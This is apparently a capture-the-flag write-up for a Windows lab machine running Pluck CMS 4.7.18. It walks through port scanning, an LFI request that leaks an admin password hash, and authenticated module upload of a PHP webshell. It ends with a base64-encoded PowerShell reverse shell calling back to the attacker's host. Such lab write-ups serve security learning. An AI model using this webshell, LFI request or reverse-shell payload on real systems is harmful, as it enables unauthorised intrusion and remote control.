
# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.231.20          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 18:08 +0100
Nmap scan report for 10.129.231.20
Host is up (0.014s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.28 seconds
```
Only port 80?

## Nmap
```python
nmap -p 80 -A --min-rate=2000 -sT 10.129.231.20
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 18:10 +0100
Nmap scan report for 10.129.231.20
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-generator: pluck 4.7.18
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-title: Mist - Mist
|_Requested resource was http://10.129.231.20/?file=mist
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

# HTTP (80)

![](Pasted%20image%2020260618181703.png)

So a few things from the landing page:
- Possible LFI or RFI
- Admin user
- powered by pluck

Clicking on admin takes me to `/login.php`

![](Pasted%20image%2020260618181851.png)

- Pluck v4.7.18
- Also no prompt for a user

After searching for the version i see an exploit for LFI

https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405

![](Pasted%20image%2020260618182648.png)

Also an attempt to test RFI gave this message

![](Pasted%20image%2020260618185426.png)

Returning to the POC i find this, admin_backup.php sounds interesting

# LFI to access administrator hash

```python
curl "http://mist.htb/data/modules/albums/albums_getimage.php?image=admin_backup.php" --verbose 
* Host mist.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.231.20
*   Trying 10.129.231.20:80...
* Established connection to mist.htb (10.129.231.20 port 80) from 10.10.15.69 port 34710 
* using HTTP/1.x
> GET /data/modules/albums/albums_getimage.php?image=admin_backup.php HTTP/1.1
> Host: mist.htb
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 18 Jun 2026 18:00:32 GMT
< Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
< X-Powered-By: PHP/8.1.1
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Pragma: no-cache
< Content-Length: 149
< Content-Type: image/jpeg
< 
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
* Connection #0 to host mist.htb:80 left intact
?>146
```

This looks to be a hash

![](Pasted%20image%2020260618190306.png)

This hash is on crackstation

# Access as the administrator on the web server

![](Pasted%20image%2020260618190405.png)

The password worked

And after reading about exploits earlier i saw an RCE but that was authenticated which was not helpful at that point, but i can use it now.

https://www.blackduck.com/blog/a-deep-dive-on-pluck-cms-vulnerability-cve-2023-25828.html

# Reverse shell

```python
cat shell.php                                             
<?php system($_REQUEST['cmd']); ?>
```
Ill start by making the php file

```python
zip -r shell.zip exploit                                       
  adding: exploit/ (stored 0%)
  adding: exploit/shell.php (stored 0%)
```
Then ill place it inside a directory called `exploit` then zip the full directory

Now i can upload this zip by going to `options` then `manage modules` then i can choose `install a module`

![](Pasted%20image%2020260618193729.png)

Now ill upload the zip and install it

![](Pasted%20image%2020260618194024.png)

Then in this path i find my webshell

I can then go inside shell then the other folder to find `shell.php` 

I will then proxy the request

![](Pasted%20image%2020260618200839.png)

I now have RCE

However shortly after, the module is removed so i think there is a cleanup script running

```python
http://mist.htb/data/modules/shell/exploit/shell.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANgA5ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

I try running the payload above which is a powershell #3 (base64) encoded payload that usually works for windows environments. 

Its possible that ANSI is preventing this

